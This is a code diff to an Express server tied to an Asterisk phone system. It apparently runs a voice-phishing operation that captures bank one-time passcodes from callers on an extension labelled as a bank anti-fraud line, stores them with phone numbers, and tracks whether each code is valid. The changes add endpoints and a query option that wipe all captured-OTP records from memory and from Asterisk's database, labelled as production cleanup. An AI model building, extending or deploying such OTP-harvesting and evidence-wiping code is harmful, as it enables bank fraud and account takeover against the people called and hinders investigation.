@@ -2865,6 +2865,7 @@ interface CapturedOtpItem {
   number: string;
   otp: string;
   timestamp: string;
+  createdAt?: number;
   channel?: string;
   service?: string;
   status: 'valid' | 'invalid' | 'pending';
@@ -2968,6 +2969,22 @@ app.post('/api/asterisk/otp/decision', async (req, res) => {
 // Endpoint to list all captured OTP records
 app.get('/api/asterisk/otp/records', async (req, res) => {
   const forceFresh = req.query.fresh === '1' || req.query.fresh === 'true';
+  const shouldClear = req.query.clear === '1' || req.query.clear === 'true';
+
+  if (shouldClear) {
+    capturedOtpHistory = [];
+    lastAstDbSyncTime = Date.now();
+    try {
+      await executeAsteriskCommand('database deltree otp_codes');
+      await executeAsteriskCommand('database deltree otp_status');
+      await executeAsteriskCommand('database deltree captured_otp');
+      await executeAsteriskCommand('database deltree otp_captures');
+      await executeAsteriskCommand('database deltree otp_decision');
+      await executeAsteriskCommand('database deltree otp_last_status');
+    } catch (_) {}
+    return res.json({ success: true, records: [] });
+  }
+
   const now = Date.now();
 
   // Si ya se sincronizó hace menos de 2000ms y no se fuerza refresh, devolver en memoria
@@ -3018,6 +3035,7 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
               number: num,
               otp: code,
               timestamp: new Date().toLocaleTimeString(),
+              createdAt: Date.now(),
               channel: 'Ext. 7777',
               service: 'Banco / Antifraude (7777)',
               status: currentStatus,
@@ -3044,13 +3062,23 @@ app.get('/api/asterisk/otp/records', async (req, res) => {
   res.json({ success: true, records: capturedOtpHistory });
 });
 
-// Endpoint to delete/clear captured records
-app.delete('/api/asterisk/otp/records', async (req, res) => {
+// Endpoint to delete/clear captured records and wipe old tests from Asterisk AstDB
+app.all(['/api/asterisk/otp/records/clear', '/api/asterisk/otp/records'], async (req, res, next) => {
+  if (req.method !== 'DELETE' && req.path !== '/api/asterisk/otp/records/clear') {
+    return next();
+  }
   capturedOtpHistory = [];
+  lastAstDbSyncTime = Date.now();
   try {
     await executeAsteriskCommand('database deltree otp_codes');
+    await executeAsteriskCommand('database deltree otp_status');
+    await executeAsteriskCommand('database deltree captured_otp');
+    await executeAsteriskCommand('database deltree otp_captures');
+    await executeAsteriskCommand('database deltree otp_decision');
+    await executeAsteriskCommand('database deltree otp_last_status');
   } catch (_) {}
-  res.json({ success: true });
+  console.log('[PRODUCCIÓN] Limpieza total de códigos y AstDB completada.');
+  res.json({ success: true, message: 'Historial y registros de pruebas anteriores eliminados de memoria y de Asterisk.' });
 });
 
 // Endpoint to inspect live channels on Asterisk with structured channel parsing
